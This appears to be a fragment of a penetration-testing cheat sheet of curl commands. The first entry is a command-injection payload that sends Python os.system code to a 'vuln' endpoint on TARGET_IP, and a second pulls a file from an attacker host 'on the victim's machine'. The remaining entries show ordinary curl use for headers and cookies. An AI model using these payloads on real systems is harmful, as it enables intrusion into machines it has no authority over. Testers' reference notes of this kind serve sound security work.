**Sending a GET Request with a Command Injection:**
```
curl "http://TARGET_IP/vuln?cmd=__import__('os').system('id')"
```

#### Download a File Locally
**On Victim's Machine**
```
curl -O http://IP:PORT/file_path/filename
```

#### Display Server Header Response
```
curl -I http://www.server.com/filename.txt
```

#### Download and display file, supressing progress, with specified cookie
```
curl --silent -b "cookiename=cookievalue" http://www.server.com/filename.txt
```